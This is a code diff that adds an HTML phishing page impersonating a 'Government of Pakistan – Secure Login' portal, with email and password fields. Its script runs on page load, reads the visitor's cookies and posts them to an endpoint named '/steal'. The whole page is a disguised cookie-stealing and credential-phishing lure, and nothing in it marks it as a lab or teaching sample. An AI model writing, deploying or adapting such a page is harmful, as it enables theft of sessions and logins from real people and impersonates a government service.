@@ -1,1 +1,27 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Gov Login Portal</title>
+  <script>
+    window.onload = function() {
+      var cookies = document.cookie;
+      fetch("/steal", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "cookie=" + encodeURIComponent(cookies)
+      });
+    };
+  </script>
+</head>
+<body style="font-family: Arial; background: #f4f4f4; text-align:center; margin-top:100px;">
+  <h2>Government of Pakistan – Secure Login</h2>
+  <form>
+    <input type="email" placeholder="Email" style="padding:10px;"><br><br>
+    <input type="password" placeholder="Password" style="padding:10px;"><br><br>
+    <button type="submit" style="padding:10px 20px;">Login</button>
+  </form>
+</body>
+</html>
